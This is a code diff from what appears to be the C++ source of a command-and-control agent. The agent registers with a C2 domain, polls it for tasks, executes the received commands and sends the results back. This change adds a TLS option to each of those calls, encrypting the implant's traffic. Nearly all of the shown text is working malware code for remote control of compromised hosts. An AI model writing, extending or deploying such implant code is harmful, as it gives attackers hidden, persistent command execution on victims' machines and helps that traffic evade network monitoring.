@@ -18,6 +18,7 @@ std::string password = "password";
 int port = 5000;
 std::string agentId;
 DWORD sleepTime = 10 * 1000;
+BOOL useTLS = TRUE;  // set to true for HTTPs
 
 // generate a random agent id of size digits
 std::string generateRandomId(int size) {
@@ -41,7 +42,7 @@ BOOL registerAgent() {
     };
 
     std::string jsonString = jsonPayload.dump();
-    std::string response = httpPost(c2Domain, port, registerURI, jsonString);
+    std::string response = httpPost(c2Domain, port, registerURI, jsonString, useTLS);
     if (response == "Error") {
         return FALSE;
     }
@@ -71,7 +72,7 @@ void executeCommands(std::vector<std::string> cmds) {
 
         std::string jsonString = jsonResult.dump();
 
-        std::string response = httpPost(c2Domain, port, sendResultURI, jsonString);
+        std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);
 
         if (response == "Error") {
             return;
@@ -89,7 +90,7 @@ void getTasksAndExecute() {
     };
     std::string jsonString = jsonPayload.dump();
 
-    std::string response = httpPost(c2Domain, port, getTaskURI, jsonString);
+    std::string response = httpPost(c2Domain, port, getTaskURI, jsonString, useTLS);
 
     if (response == "Error") {
         return;
